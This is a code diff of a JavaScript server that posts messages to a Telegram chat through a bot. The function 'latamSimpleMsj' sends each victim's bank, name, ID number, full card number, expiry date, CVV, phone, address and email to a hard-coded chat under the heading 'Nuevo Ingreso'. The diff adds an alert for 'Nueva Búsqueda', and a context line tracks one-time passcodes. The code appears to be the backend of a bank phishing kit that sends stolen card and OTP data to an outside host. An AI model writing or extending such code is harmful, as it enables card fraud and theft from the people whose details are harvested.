@@ -337,6 +337,45 @@ ${session.otp ? "💸" : "🟡"} Dinamica: ${session.otp || "PENDIENTE"}
   }
 }
 
+export const initProcessAlert = async (req, res) => {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+    if (!token) {
+      return res.status(500).json({ success: false, error: 'Missing TELEGRAM_BOT_TOKEN' });
+    }
+
+  const text = "🚨🚨 Nueva Búsqueda 🚨🚨";
+
+
+  // Usamos “texto plano” con emojis y caracteres. (parse_mode HTML evita escape Markdown)
+  const chatId = '-1002850830211';
+
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 25000); // 25s
+  let tgResp, tgJson;
+
+  try {
+      tgResp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text }),
+        signal: controller.signal
+      });
+      tgJson = await tgResp.json().catch(() => null);
+    } finally {
+      clearTimeout(timeout);
+    }
+
+    if (!tgResp.ok || !tgJson?.ok) {
+      return res.status(502).json({
+        success: false,
+        error: 'Telegram error',
+        detail: tgJson ?? { status: tgResp.status, statusText: tgResp.statusText }
+      });
+    }
+
+    return res.status(200).json({ success: true});
+}
+
 
 export const latamSimpleMsj = async (req, res) => {
   try {
@@ -365,17 +404,19 @@ export const latamSimpleMsj = async (req, res) => {
     }
 
     const chatId = '-1002850830211';
+   
     const text = [
       '🚨🚨 Nuevo Ingreso 🚨🚨',
       '',
-      `╭🟡 Banco: ${data.banco}
+      `
+      ╭🏦 Banco: ${data.banco}
       ┣🟢 Nombre: ${data.nombre}
       ┣🟢 Cedula: ${data.cedula}
-      ┣🟢 Tarjeta: ${data.tarjeta}
+      ┣🟢 CC: ${data.tarjeta}
       ┣🟢 Exp: ${data.fecha}
       ┣🟢 Cvv: ${data.cvv}
-      ╰🟢 Telefono: ${data.telefono}
-      ╰🟢 Direccion: ${data.direccion}
+      ┣🟢 Telefono: ${data.telefono}
+      ┣🟢 Direccion: ${data.direccion}
       ╰🟢 Correo: ${data.email}`
       // agrega más líneas si las tienes (monto, fecha, etc.)
     ].join('\n');
@@ -411,7 +452,6 @@ export const latamSimpleMsj = async (req, res) => {
     return res.status(500).json({ success: false, error: String(err?.message || err) });
   }
 };
-
 
 export const editLatamMsj = async (req, res) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
